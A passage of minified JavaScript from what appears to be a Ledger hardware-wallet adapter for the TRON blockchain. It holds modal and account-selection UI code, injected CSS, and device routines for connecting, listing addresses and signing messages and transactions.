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",
                    alt: "logo"
                })
            })
        }
        function en() {
            return ee("div", {
                className: "ledger-ant-spin ledger-ant-spin-lg ledger-ant-spin-spinning spin",
                children: ee("span", {
                    className: "ledger-ant-spin-dot",
                    children: [ee("i", {
                        className: "ledger-ant-spin-dot-item"
                    }), ee("i", {
                        className: "ledger-ant-spin-dot-item"
                    }), ee("i", {
                        className: "ledger-ant-spin-dot-item"
                    }), ee("i", {
                        className: "ledger-ant-spin-dot-item"
                    })]
                })
            })
        }
        function nn(t) {
            const e = ye( () => $e(), []);
            return ee("div", {
                style: {
                    textAlign: "center"
                },
                "data-testid": "confirm-content",
                children: [ee(tn, {}), ee("div", {
                    className: "ledger-connecting-pop",
                    children: [ee("ul", {
                        className: "ledger-connecting-pop-content",
                        children: [ee("li", {
                            className: "title",
                            style: {
                                wordBreak: "break-word"
                            },
                            children: e.checkTitle
                        }), ee("li", {
                            children: ee("strong", {
                                style: {
                                    color: "#B0170D",
                                    textAlign: "left",
                                    fontWeight: "600"
                                },
                                "data-testid": "confirm-content-address",
                                children: t.address
                            })
                        }), ee("li", {
                            children: e.checkTip0
                        }), ee("li", {
                            children: e.checkTip1
                        })]
                    }), ee("div", {
                        className: "mt-4",
                        children: [ee(en, {}), ee("div", {
                            children: ee("div", {
                                className: "text-muted",
                                children: ee("span", {
                                    children: e.confirmTip
                                })
                            })
                        })]
                    })]
                })]
            })
        }
        function rn() {
            const t = ye( () => $e(), []);
            return ee("div", {
                style: {
                    textAlign: "center"
                },
                "data-testid": "connecting-content",
                children: [ee(tn, {}), ee("div", {
                    className: "ledger-connecting-pop",
                    children: [ee("ul", {
                        className: "ledger-connecting-pop-content",
                        children: ee("li", {
                            className: "title",
                            children: t.loadingTip0
                        })
                    }), ee("div", {
                        className: "mt-4",
                        children: [ee(en, {}), ee("div", {
                            children: ee("div", {
                                className: "text-muted",
                                children: ee("span", {
                                    children: t.loadingTip4
                                })
                            })
                        })]
                    })]
                })]
            })
        }
        function on(t) {
            return ee("div", {
                className: "ledger-modal-root",
                children: [ee("div", {
                    className: "ledger-modal-mask"
                }), ee("div", {
                    className: "ledger-modal-wrap",
                    children: ee("div", {
                        className: "ledger-modal",
                        style: {
                            width: t.width || "550px"
                        },
                        children: ee("div", {
                            className: "ledger-modal-content",
                            children: [ee("button", {
                                onClick: t.onClose,
                                type: "button",
                                "aria-label": "Close",
                                className: "ledger-modal-close",
                                children: ee("span", {
                                    className: "ledger-modal-close-x",
                                    children: ee("i", {
                                        "aria-label": "icon: close",
                                        className: "icon icon-close ledger-modal-close-icon",
                                        children: ee("svg", {
                                            viewBox: "64 64 896 896",
                                            focusable: "false",
                                            className: "",
                                            "data-icon": "close",
                                            width: "1em",
                                            height: "1em",
                                            fill: "currentColor",
                                            "aria-hidden": "true",
                                            children: ee("path", {
                                                d: "M563.8 512l262.5-312.9c4.4-5.2.7-13.1-6.1-13.1h-79.8c-4.7 0-9.2 2.1-12.3 5.7L511.6 449.8 295.1 191.7c-3-3.6-7.5-5.7-12.3-5.7H203c-6.8 0-10.5 7.9-6.1 13.1L459.4 512 196.9 824.9A7.95 7.95 0 0 0 203 838h79.8c4.7 0 9.2-2.1 12.3-5.7l216.5-258.1 216.5 258.1c3 3.6 7.5 5.7 12.3 5.7h79.8c6.8 0 10.5-7.9 6.1-13.1L563.8 512z"
                                            })
                                        })
                                    })
                                })
                            }), ee("div", {
                                className: "ledger-modal-header",
                                children: ee("div", {
                                    className: "ledger-modal-title",
                                    children: t.title
                                })
                            }), ee("div", {
                                className: "ledger-modal-body",
                                children: t.children
                            })]
                        })
                    })
                })]
            })
        }
        function sn(t) {
            const [e,n] = we(0)
              , [r,i] = we([])
              , [o,s] = we(!1)
              , a = function(t) {
                return se = 5,
                ye(function() {
                    return {
                        current: t
                    }
                }, [])
            }(null)
              , c = ye( () => $e(), []);
            function l(t) {
                n(+t.target.value)
            }
            return me( () => {
                i([...t.accounts])
            }
            , [t.accounts]),
            me( () => {
                n(t.selectedIndex)
            }
            , [t.selectedIndex]),
            function(t, e) {
                var n = ge(ne++, 4);
                !ce.__s && Ae(n.__H, e) && (n.__ = t,
                n.u = e,
                re.__h.push(n))
            }( () => {
                var t, e;
                null === (e = null === (t = a.current) || void 0 === t ? void 0 : t.scrollIntoView) || void 0 === e || e.call(t)
            }
            , [r]),
            ee("div", {
                style: {
                    paddingLeft: 40
                },
                className: "ledger-select",
                "data-testid": "select-account-content",
                children: [ee("span", {
                    className: "title",
                    children: c.selectTip
                }), ee("div", {
                    className: "ledger-select-list-wrap",
                    children: [ee("ul", {
                        className: "ledger-select-list",
                        "data-testid": "select-account-list",
                        children: r.map( (t, n) => ee("li", {
                            className: "ledger-select-item",
                            children: ee("label", {
                                htmlFor: `ledger-select-radio${n}`,
                                children: [ee("input", {
                                    className: t.index === e ? "checked" : "",
                                    id: `ledger-select-radio${n}`,
                                    type: "radio",
                                    name: "selectedAddress",
                                    value: t.index,
                                    checked: t.index === e,
                                    onInput: l
                                }), ee("span", {
                                    children: t.address
                                })]
                            })
                        }, n))
                    }), ee("div", {
                        style: {
                            display: "flex",
                            justifyContent: "flex-end"
                        },
                        children: ee("button", {
                            "data-testid": "btn-load-more",
                            ref: a,
                            style: {
                                marginTop: 10
                            },
                            disabled: o,
                            className: "ledger-select-button",
                            onClick: function() {
                                return function(t, e, n, r) {
                                    return new (n || (n = Promise))(function(i, o) {
                                        function s(t) {
                                            try {
                                                c(r.next(t))
                                            } catch (t) {
                                                o(t)
                                            }
                                        }
                                        function a(t) {
                                            try {
                                                c(r.throw(t))
                                            } catch (t) {
                                                o(t)
                                            }
                                        }
                                        function c(t) {
                                            var e;
                                            t.done ? i(t.value) : (e = t.value,
                                            e instanceof n ? e : new n(function(t) {
                                                t(e)
                                            }
                                            )).then(s, a)
                                        }
                                        c((r = r.apply(t, e || [])).next())
                                    }
                                    )
                                }(this, void 0, void 0, function*() {
                                    s(!0);
                                    const e = r[r.length - 1] || {
                                        index: -1
                                    }
                                      , n = e.index + 1
                                      , o = e.index + 6;
                                    try {
                                        const e = yield t.getAccounts(n, o);
                                        i(t => [...t, ...e])
                                    } finally {
                                        s(!1)
                                    }
                                })
                            },
                            children: [ee("span", {
                                style: {
                                    marginRight: o ? 10 : 0
                                },
                                children: c.loadMore
                            }), o ? ee("svg", {
                                width: "18",
                                height: "18",
                                viewBox: "0 0 38 38",
                                xmlns: "http://www.w3.org/2000/svg",
                                stroke: "#fff",
                                children: ee("g", {
                                    fill: "none",
                                    fillRule: "evenodd",
                                    children: ee("g", {
                                        transform: "translate(1 1)",
                                        strokeWidth: "2",
                                        children: [ee("circle", {
                                            strokeOpacity: ".5",
                                            cx: "18",
                                            cy: "18",
                                            r: "18"
                                        }), ee("path", {
                                            d: "M36 18c0-9.94-8.06-18-18-18",
                                            children: ee("animateTransform", {
                                                attributeName: "transform",
                                                type: "rotate",
                                                from: "0 18 18",
                                                to: "360 18 18",
                                                dur: "1s",
                                                repeatCount: "indefinite"
                                            })
                                        })]
                                    })
                                })
                            }) : null]
                        })
                    })]
                }), ee("footer", {
                    style: {
                        display: "flex",
                        justifyContent: "flex-end"
                    },
                    children: [ee("button", {
                        "data-testid": "btn-cancel",
                        style: {
                            marginRight: 10
                        },
                        className: "ledger-select-button default-button",
                        onClick: function() {
                            t.onCancel()
                        },
                        children: c.cancel
                    }), ee("button", {
                        "data-testid": "btn-confirm",
                        disabled: o,
                        className: "ledger-select-button",
                        onClick: function() {
                            const n = r.find(t => t.index === e);
                            t.onConfirm(n || (null == r ? void 0 : r[0]))
                        },
                        children: c.confirm
                    })]
                })]
            })
        }
        function an() {
            const t = document.createElement("div")
              , e = document.createElement("style");
            return e.innerHTML = "\n.ledger-modal-mask, .ledger-modal-wrap {\n    position: fixed;\n    top: 0;\n    right: 0;\n    bottom: 0;\n    left: 0;\n    z-index: 1000;\n    font-family: 'PingFangSC-Regular', 'Arial', sans-serif, 'Droid Sans', 'Helvetica Neue';\n}\n.ledger-modal-mask {\n    height: 100%;\n    background-color: rgba(0, 0, 0, 0.45);\n}\n.ledger-modal-wrap {\n    overflow: auto;\n    outline: 0;\n}\n.ledger-modal {\n  position: relative;\n  margin: 0 auto;\n  padding-bottom: 24px;\n  line-height: 1.5;\n  top: 50px;\n  width: 600px;\n  color: rgba(0, 0, 0, 0.65);\n}\n.ledger-modal-content {\n  position: relative;\n  background-color: #fff;\n  background-clip: padding-box;\n  border: 0;\n  border-radius: 4px;\n  box-shadow: 0 4px 12px rgb(0 0 0 / 15%);\n  pointer-events: auto;\n}\n.ledger-modal-close {\n  -webkit-appearance: button;\n  position: absolute;\n  top: 0;\n  right: 0;\n  z-index: 10;\n  padding: 0;\n  color: rgba(0, 0, 0, 0.45);\n  font-weight: 700;\n  line-height: 1;\n  text-decoration: none;\n  background: transparent;\n  border: 0;\n  outline: 0;\n  cursor: pointer;\n  transition: color 0.3s;\n}\n.ledger-modal-close:focus,.ledger-modal-close:active,.ledger-modal-close:hover {\n  color: rgba(0, 0, 0, 0.75);\n  text-decoration: none;\n  border: none;\n  outline: none;\n}\n.ledger-modal-close-x {\n  display: block;\n  width: 56px;\n  height: 56px;\n  font-size: 16px;\n  font-style: normal;\n  line-height: 56px;\n  text-align: center;\n  text-transform: none;\n  text-rendering: auto;\n}\n.ledger-modal-close-x .icon {\n  display: inline-block;\n  color: inherit;\n  font-style: normal;\n  line-height: 0;\n  text-align: center;\n  text-transform: none;\n  vertical-align: -0.125em;\n  text-rendering: optimizeLegibility;\n  -webkit-font-smoothing: antialiased;\n}\n.ledger-modal-header {\n  padding: 16px 24px;\n  color: rgba(0, 0, 0, 0.65);\n  background: #fff;\n  border-bottom: 1px solid #e8e8e8;\n  border-radius: 4px 4px 0 0;\n}\n.ledger-select .title, .ledger-modal-title {\n  margin: 0;\n  color: rgba(0, 0, 0, 0.85);\n  font-weight: 500;\n  font-size: 18px;\n  line-height: 22px;\n  word-wrap: break-word;\n}\n.ledger-modal-body {\n  padding: 24px;\n  font-size: 14px;\n  line-height: 1.5;\n  word-wrap: break-word;\n  max-height: 650px;\n  overflow-y: auto;\n}\n\n\n// connecting content\n.ledger-connecting-pop ul {\n  margin: 0;\n}\n.ledger-connecting-pop-content {\n  padding-left: 8%;\n}\n.ledger-connecting-pop-content li, .ledger-select li {\n  display: flex;\n  margin: 10px 0 10px 0;\n  line-height: 25px;\n  word-break: break-all;\n  text-align: left;\n}\n.ledger-connecting-pop-content .title {\n  margin-bottom: 20px;\n  font-weight: bold;\n}\n.ledger-ant-spin {\n  box-sizing: border-box;\n  padding: 0;\n  font-size: 14px;\n  font-variant: tabular-nums;\n  line-height: 1.5;\n  list-style: none;\n  font-feature-settings: 'tnum';\n  color: #B0170D;\n  vertical-align: middle;\n  transition: transform 0.3s cubic-bezier(0.78, 0.14, 0.15, 0.86);\n  position: static;\n  opacity: 1;\n  margin: 2vw 0;\n  text-align: center;\n  display: block;\n}\n.ledger-ant-spin-dot {\n  position: relative;\n  display: inline-block;\n  font-size: 20px;\n  width: 1em;\n  height: 1em;\n  transform: rotate(45deg);\n  animation: antRotate 1.2s infinite linear;\n  font-size: 32px;\n}\n\n.ledger-ant-spin-dot-item {\n  position: absolute;\n  display: block;\n  width: 9px;\n  height: 9px;\n  background-color: #B0170D;\n  border-radius: 100%;\n  transform: scale(0.75);\n  transform-origin: 50% 50%;\n  opacity: 0.3;\n  animation: antSpinMove 1s infinite linear alternate;\n}\n.ledger-ant-spin-dot-item:nth-child(1) {\n  top: 0;\n  left: 0;\n}\n.ledger-ant-spin-dot-item:nth-child(2) {\n  top: 0;\n  right: 0;\n  animation-delay: 0.4s;\n}\n.ledger-ant-spin-dot-item:nth-child(3) {\n  right: 0;\n  bottom: 0;\n  animation-delay: 0.8s;\n}\n.ledger-ant-spin-dot-item:nth-child(4) {\n  bottom: 0;\n  left: 0;\n  animation-delay: 1.2s;\n}\n.ledger-ant-spin-lg .ledger-ant-spin-dot i {\n  width: 14px;\n  height: 14px;\n}\n@keyframes antRotate {\n  100% {\n    transform: rotate(405deg)\n  }\n}\n@keyframes antSpinMove {\n  100% {\n    opacity: 1;\n  }\n}\n\n.ledger-select {\n  text-align: left;\n}\n.ledger-select .title {\n  display: block;\n  margin-bottom: 10px;\n}\n.ledger-select-list-wrap {\n  width: 100%;\n  max-height: 400px;\n  overflow-y: auto;\n  margin: 0 0 20px 0;\n}\n.ledger-select-list {\n  margin-top: 0;\n  padding: 0;\n}\n.ledger-select-item {\n  font-size: 14px;\n  color: #2f2f2f;\n  line-height: 25px;\n  margin-top: 0;\n}\n.ledger-select-item:hover {\n  color: #6f6f6f;\n}\n.ledger-select-item label {\n  cursor: pointer;\n  width: 100%;\n  display: flex;\n}\n.ledger-select-item input {\n  width: 15px;\n  height: 25px;\n  margin: 0 10px 0 0;\n}\n.ledger-select-button {\n  display: inline-flex;\n  color: #fff;\n  cursor: pointer;\n  height: 36px;\n  background-color: #c23631;\n  border: none;\n  border-radius: 4px;\n  align-items: center;\n  padding: 0 18px;\n  font-family: DM Sans, Roboto, Helvetica Neue, Helvetica, Arial, sans-serif;\n  font-size: 14px;\n  font-weight: 500;\n  line-height: 36px;\n  user-select: none;\n  -webkit-tap-highlight-color: transparent;\n}\n.ledger-select-button[disabled] {\n  cursor: not-allowed;\n}\n.ledger-select-button.default-button {\n  background-color: #fff;\n  color: rgba(0, 0, 0, 0.65);\n  border: 1px solid #dcdfe6;\n}\n.ledger-select-button:focus {\n  outline: none;\n}\n.ledger-select-button:focus-visible {\n  outline: 2px solid white;\n}\n.ledger-select-button:hover {\n  opacity: 0.7;\n}\n",
            document.body.append(e),
            document.body.append(t),
            {
                onClose: function() {
                    t.remove(),
                    e.remove()
                },
                div: t
            }
        }
        var cn = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        };
        function ln(t) {
            return cn(this, void 0, void 0, function*() {
                return new Promise(e => {
                    setTimeout(e, t)
                }
                )
            })
        }
        const dn = function(t) {
            return cn(this, arguments, void 0, function*({accounts: t, ledgerUtils: e}) {
                const n = yield function(t) {
                    const {onClose: e, div: n} = an()
                      , r = $e();
                    return new Promise( (i, o) => {
                        function s() {
                            o(new Error("Operation is canceled.")),
                            e()
                        }
                        Ve(ee(on, {
                            title: r.loadingTitle,
                            onClose: s,
                            children: ee(sn, {
                                accounts: t.accounts,
                                selectedIndex: t.selectedIndex || 0,
                                onConfirm: function(t) {
                                    i(t),
                                    e()
                                },
                                onCancel: s,
                                getAccounts: t.getAccounts
                            })
                        }), n)
                    }
                    )
                }({
                    accounts: t,
                    getAccounts: e.getAccounts
                })
                  , r = function(t) {
                    const {onClose: e, div: n} = an();
                    return Ve(ee(on, {
                        width: 550,
                        title: $e().loadingTitle,
                        onClose: e,
                        children: ee(nn, {
                            address: t
                        })
                    }), n),
                    e
                }(n.address);
                try {
                    yield e.getAddress(n.index, !0)
                } finally {
                    null == r || r()
                }
                return n
            })
        };
        class hn {
            constructor(t={}) {
                this.app = null,
                this.transport = null,
                this.fetchState = "Initial",
                this.selectedIndex = 0,
                this._address = "",
                this.getAccounts = (t, e) => cn(this, void 0, void 0, function*() {
                    if (t < 0)
                        throw new Error("getAccount parameter error: from cannot be smaller than 0.");
                    if (t >= e)
                        throw new Error("getAccount parameter error: from cannot be bigger than to.");
                    if ("Fetching" === this.fetchState)
                        return yield ln(500),
                        this.getAccounts(t, e);
                    this.fetchState = "Fetching",
                    yield this.makeApp();
                    try {
                        const n = {};
                        for (let r = t; r < e; r++) {
                            const t = yield this.getAccount(r);
                            n[t.index] = t
                        }
                        return Object.keys(n).forEach(t => {
                            this.accounts[+t] = n[t]
                        }
                        ),
                        this.accounts.slice(t, e)
                    } finally {
                        this.fetchState = "Initial",
                        yield this.cleanUp()
                    }
                }),
                this.getAddress = (t, ...e) => cn(this, [t, ...e], void 0, function*(t, e=!1) {
                    try {
                        const n = this.getPathForIndex(t);
                        return yield this.makeApp(),
                        yield this.app.getAddress(n, e)
                    } finally {
                        yield this.cleanUp()
                    }
                }),
                this.accounts = [];
                const {accountNumber: e=1} = t;
                if (["beforeConnect", "selectAccount", "getDerivationPath"].forEach(e => {
                    if (t[e] && !function(t) {
                        return "function" == typeof t
                    }(t[e]))
                        throw new Error(`[Ledger]: ${e} must be a function!`)
                }
                ),
                e && !Number.isInteger(+e))
                    throw new Error("[Ledger]: accountNumber must be an integer!");
                this.config = Object.assign(Object.assign({}, t), {
                    accountNumber: e
                })
            }
            get address() {
                return this._address
            }
            connect(t) {
                return cn(this, void 0, void 0, function*() {
                    if ((null == t ? void 0 : t.account) && "object" == typeof t.account) {
                        const e = t.account;
                        return this.selectedIndex = +e.index,
                        this._address = e.address,
                        void (void 0 !== e.index && void 0 !== e.address || console.warn("[LedgerWallet] account parameter passed to connect() should have valid index and address property"))
                    }
                    const e = {
                        getAccounts: this.getAccounts,
                        getAddress: this.getAddress
                    };
                    this.accounts = [],
                    this._address = "",
                    this.selectedIndex = 0;
                    const {accountNumber: n=1, beforeConnect: r, selectAccount: i=dn} = this.config;
                    let o = null;
                    try {
                        r ? yield r() : o = function() {
                            const {onClose: t, div: e} = an();
                            return Ve(ee(on, {
                                title: $e().loadingTitle,
                                onClose: t,
                                children: ee(rn, {})
                            }), e),
                            t
                        }(),
                        yield this.makeApp();
                        const t = yield this.getAccount(0);
                        this.accounts[0] = t,
                        yield this.cleanUp(),
                        n > 1 && (yield this.getAccounts(1, n)),
                        null == o || o();
                        const s = this.accounts.slice(0, n)
                          , a = yield i({
                            accounts: s,
                            ledgerUtils: e
                        });
                        this.selectedIndex = a.index,
                        this._address = a.address
                    } finally {
                        yield this.cleanUp()
                    }
                })
            }
            disconnect() {
                this.selectedIndex = 0,
                this._address = ""
            }
            signPersonalMessage(t) {
                return cn(this, void 0, void 0, function*() {
                    yield this.waitForIdle();
                    try {
                        const e = this.selectedIndex;
                        yield this.makeApp();
                        const n = this.getPathForIndex(e)
                          , r = Buffer.from(t).toString("hex");
                        return yield this.app.signPersonalMessage(n, r)
                    } finally {
                        yield this.cleanUp()
                    }
                })
            }
            signTransaction(t) {
                return cn(this, void 0, void 0, function*() {
                    yield this.waitForIdle();
                    try {
                        const e = this.selectedIndex
                          , n = this.getPathForIndex(e);
                        let r;
                        yield this.makeApp();
                        try {
                            r = yield this.app.signTransaction(n, t.raw_data_hex, [])
                        } catch (e) {
                            if (!/Too many bytes to encode/.test(e.message))
                                throw e;
                            r = yield this.app.signTransactionHash(n, t.txID)
                        }
                        let i = t.signature;
                        return Array.isArray(i) ? i.includes(r) || i.push(r) : i = [r],
                        Object.assign(Object.assign({}, t), {
                            signature: i
                        })
                    } finally {
                        yield this.cleanUp()
                    }
                })
            }
            getAccount(t) {
                return cn(this, void 0, void 0, function*() {
                    const e = this.getPathForIndex(t)
                      , {address: n} = yield this.app.getAddress(e);
                    return {
                        path: e,
                        address: n,
                        index: t
                    }
                })
            }
            waitForIdle() {
                return cn(this, void 0, void 0, function*() {
                    "Fetching" === this.fetchState && (yield ln(300),
                    yield this.waitForIdle())
                })
            }
            getPathForIndex(t) {
                return this.config.getDerivationPath ? this.config.getDerivationPath(t) : `44'/195'/${t}'/0/0`
            }
            makeApp() {
                return cn(this, void 0, void 0, function*() {
                    this.transport && this.app || (this.transport = yield ht.create(),
                    this.app = new T(this.transport))
                })
            }
            cleanUp() {
                return cn(this, void 0, void 0, function*() {
                    var t;
                    this.app = null,
                    yield null === (t = this.transport) || void 0 === t ? void 0 : t.close(),
                    this.transport = null
                })
            }
        }
        var un, fn, pn = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        };
        !function(t) {
            t.Mainnet = "Mainnet",
            t.Shasta = "Shasta",
            t.Nile = "Nile",
            t.Unknown = "Unknown"
        }(un || (un = {})),
        function(t) {
